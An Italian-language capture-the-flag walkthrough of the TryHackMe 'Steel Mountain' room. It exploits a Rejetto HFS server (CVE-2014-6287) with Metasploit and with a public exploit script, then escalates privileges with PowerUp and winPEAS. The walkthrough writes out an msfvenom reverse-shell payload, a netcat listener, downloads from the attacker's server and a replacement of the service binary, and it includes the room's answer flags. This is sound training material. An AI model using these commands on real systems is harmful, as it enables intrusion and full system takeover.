
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/steelmountain

Chi è il dipendente del mese?
ispeziono pagina http://10.10.6.100/
```
Bill Harper
```

Esegui la scansione della macchina con nmap. Qual è l'altra porta su cui è in esecuzione un server web?
```
nmap -sV -O -Pn 10.10.6.100
```
```
8080
```
Dai un'occhiata all'altro server web. Quale file server è in esecuzione?
```
 Rejetto HTTP File Server
```
Qual è il numero CVE per sfruttare questo file server?
```
CVE-2014-6287
```
Usa Metasploit per ottenere una shell iniziale. Qual è il flag utente?
```
msfconsole
```

```
search rejetto
```

```
use exploit/windows/http/rejetto_hfs_exec
```

```
show options
```

```
set RHOST 10.10.6.100
```

```
set RPORT 8080
```

```
run
```

```
search -f user.txt
```
```
c:\Users\bill\Desktop\user.txt 
```

```
 cat /Users/bill/Desktop/user.txt
```
```
b04763b6fcf51fcd7c13abc7db4fd365
```
oppure
```
shell
```

```
cd c:\Users\bill\Desktop
```

```
type user.txt
```

```
b04763b6fcf51fcd7c13abc7db4fd365
```

Ora che hai una shell iniziale su questa macchina Windows come Bill, possiamo enumerare ulteriormente la macchina e aumentare i nostri privilegi a root!

Rispondi alle domande qui sotto

Per enumerare questa macchina, utilizzeremo uno script PowerShell chiamato PowerUp, il cui scopo è valutare una macchina Windows e determinare eventuali anomalie:  " _PowerUp mira a essere un centro di raccolta dei comuni_  _vettori di escalation dei privilegi di Windows che si basano su configurazioni errate_ " .

Puoi scaricare lo script [qui](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1) .  Se vuoi scaricarlo tramite la riga di comando, fai attenzione a non scaricare la pagina GitHub al posto dello script grezzo.  Ora puoi usare il  comando **upload in Metasploit per caricare lo script.**

```
cd /opt
```

```
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
```

```
upload /opt/PowerUp.ps1
```
Per eseguirlo usando Meterpreter, digiterò **load powershell**  in meterpreter. Quindi entrerò  in powershell immettendo **powershell_shell** :

```
load powershell
```

```
powershell_shell
```

Prestate molta attenzione all'opzione CanRestart che è impostata su true. Qual è il nome del servizio che viene visualizzato come vulnerabilità _del percorso di servizio non quotata ?_

```
. .\PowerUp.ps1
```

```
Invoke-AllChecks
```

```
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

```

```
AdvancedSystemCareService9
```
	vulnerabilità

L'opzione CanRestart, se vera, ci consente di riavviare un servizio sul sistema, la directory dell'applicazione è anche scrivibile. Ciò significa che possiamo sostituire l'applicazione legittima con quella dannosa, riavviare il servizio, che eseguirà il nostro programma infetto!

Utilizzare msfvenom per generare una shell inversa come eseguibile di Windows.

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.216.158 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

Carica il tuo binario e sostituisci quello legittimo. Quindi riavvia il programma per ottenere una shell come root.  

**Nota:** il servizio è risultato non quotato (e potrebbe essere sfruttato utilizzando questa tecnica); tuttavia, in questo caso abbiamo sfruttato i permessi file deboli sui file del servizio.

Questo può quindi essere caricato sul computer di destinazione tramite la shell meterpreter (uscire prima dalla sessione di PowerShell tramite CTRL+C):
```
upload /root/Advanced.exe
```
```
[*] Uploading  : /root/Advanced.exe -> Advanced.exe
[*] Uploaded 15.50 KiB of 15.50 KiB (100.0%): /root/Advanced.exe -> Advanced.exe
[*] Completed  : /root/Advanced.exe -> Advanced.exe

```

Tornando alla shell di Windows possiamo interrompere l'esecuzione del servizio legittimo e quindi sostituire il file dell'applicazione con il binario dannoso:

```
shell
```

```
sc stop AdvancedSystemCareService9
```

```
copy Advanced.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
```
Prima di riavviare il servizio, dobbiamo impostare un listener nel nostro terminale locale:
```
nc -nlvp 4443
```
Il servizio può quindi essere riavviato all'interno della shell di Windows:
```
sc start AdvancedSystemCareService9
```

```
cd C:\users\administrator\desktop
```

```
more root.txt
```

```
9af5f314f57607c00fd09803a587db80
```

==Accesso ed escalation senza Metasploit==

Ora completiamo la stanza senza usare Metasploit .

Per questo utilizzeremo PowerShell e WinPEAS per enumerare il sistema e raccogliere le informazioni rilevanti da inoltrare a  

Rispondi alle domande qui sotto

Per iniziare useremo lo stesso CVE. Tuttavia, questa volta usiamo questo [exploit.](https://www.exploit-db.com/exploits/39161)

*Nota che affinché tutto funzioni, è necessario che un server web e un listener netcat siano attivi contemporaneamente!*

Per iniziare, avrai bisogno di un binario statico netcat sul tuo server web. Se non ne hai uno, puoi scaricarlo da [GitHub](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe) !

Dovrai eseguire l'exploit due volte. La prima volta estrarrà il nostro binario netcat nel sistema e la seconda eseguirà il nostro payload per ottenere un callback!

Scarichiamo prima i files poi
```
cd /root
```

```
nano  39161.py
```
	modifichiamo LHOST LPORT 4433
```
2to3 -w 39161.py
```
	convertiamo in python3
```
mv ncat.exe nc.exe
```

```
python -m SimpleHTTPServer 80
```

```
 nc -lvnp 4433
```

```
python3 39161.py 10.10.225.84 8080
```
```
python3 39161.py 10.10.225.84 8080
```

Congratulazioni, ora siamo sul sistema. Ora possiamo estrarre winPEAS sul sistema usando powershell -c.

Una volta eseguito winPeas, vediamo che ci indirizza verso percorsi non quotati. Possiamo vedere che ci fornisce anche il nome del servizio che sta eseguendo.

Utilizzeremo  winPEAS, che può essere scaricato [qui](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/winPEAS/bin/Release?ref=blog.razrsec.uk) .
https://github.com/peass-ng/PEASS-ng/releases/download/20241205-c8c0c3e5/winPEASx86.exe


```
powershell -c wget "http://10.11.116.149/winPEASx86.exe" -outfile "winPEAS.exe"
```

```
winPEAS.exe
```

Quale comando PowerShell -c potremmo eseguire per scoprire manualmente il nome del servizio?

```
powershell -c "Get-Service"
```

Ora passiamo all'Amministratore con le nostre nuove conoscenze.

Genera il tuo payload usando msfvenom e caricalo sul sistema usando PowerShell.

  
Ora possiamo spostare il nostro payload nella directory non quotata indicata da winPEAS e riavviare il servizio con due comandi.

Per prima cosa dobbiamo interrompere il servizio. Possiamo farlo nel seguente modo:

sc stop AdvancedSystemCareService9

Seguito a breve da;

sc avvia AdvancedSystemCareService9

Una volta eseguito questo comando, otterrai una shell come amministratore sul nostro listener!